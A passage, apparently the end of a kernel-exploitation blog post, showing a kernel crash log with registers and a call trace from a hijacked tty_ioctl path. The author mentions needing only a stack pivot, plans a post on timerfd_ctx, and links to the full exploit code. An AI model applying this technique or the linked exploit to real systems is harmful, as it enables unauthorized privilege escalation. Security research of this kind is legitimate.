+[    6.264890] RDX: ff3f053e81bc5c30 RSI: 0000000081bc5c30 RDI: ff3f053e81bc5800
+[    6.265183] RBP: ff3f053e81bc5800 R08: ff3f053e81bc5c30 R09: 0000000000000000
+[    6.265442] R10: ff7fee2640193ee8 R11: 0000000000000000 R12: ff3f053e81bc5c30
+[    6.265702] R13: ff3f053e81c05d00 R14: ff3f053e81cb8000 R15: 0000000000000000
+[    6.266041] FS:  000000000056a3c0(0000) GS:ff3f053e87600000(0000) knlGS:0000000000000000
+[    6.266378] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    6.266604] CR2: 00000000c319b808 CR3: 0000000001c10000 CR4: 0000000000751ef0
+[    6.266901] PKRU: 55555554
+[    6.267100] Call Trace:
+[    6.268124]  <TASK>
+[    6.268562]  ? __die+0x1e/0x60
+[    6.268773]  ? page_fault_oops+0x17c/0x470
+[    6.268931]  ? avc_has_extended_perms+0x233/0x520
+[    6.269139]  ? exc_page_fault+0x6b/0x150
+[    6.269323]  ? asm_exc_page_fault+0x26/0x30
+[    6.269497]  ? e1000e_read_phy_reg_m88+0x45/0x60
+[    6.269656]  ? e1000e_read_phy_reg_m88+0x46/0x60
+[    6.269784]  ? tty_ioctl+0x4fc/0x8c0
+[    6.269870]  ? __x64_sys_ioctl+0x92/0xd0
+[    6.269985]  ? do_syscall_64+0x3f/0x90
+[    6.270074]  ? entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+[    6.270247]  </TASK>
+```
+
+At this point, I just needed a stack pivot. 
+
+But well, we are mostly only limited to the constraints we set for ourselves. In my next blog, I will be exploring the usage of `timerfd_ctx` which has been documented barely compared to our current approach.
+
+Full Code for the above exploit: [Github Gist](https://gist.github.com/Utkar5hM/577aafe73a97988376b5a548d2e4df6d)
